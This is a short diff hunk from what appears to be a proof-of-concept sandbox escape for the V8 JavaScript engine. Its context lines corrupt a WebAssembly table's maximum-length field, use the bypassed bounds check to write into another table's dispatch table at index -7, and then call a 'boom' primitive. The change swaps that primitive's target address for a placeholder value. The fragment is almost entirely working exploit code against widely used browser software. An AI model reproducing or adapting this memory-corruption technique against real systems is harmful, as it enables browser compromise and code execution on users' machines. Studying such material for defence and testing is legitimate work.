@@ -68,4 +68,4 @@ setField(getPtr(table_v_ls), kWasmTableObjectMaximumLengthOffset, kSmiMinusOne);
 // Check bypassed, write @ index -7 -> writes into table_v_ll dispatch table!
 table_v_ls.set(0xfffffff9, writer);
 
-boom(BigInt(Sandbox.targetPage) - 0x7n, 42n);
+boom(0x414141414141n, 42n);
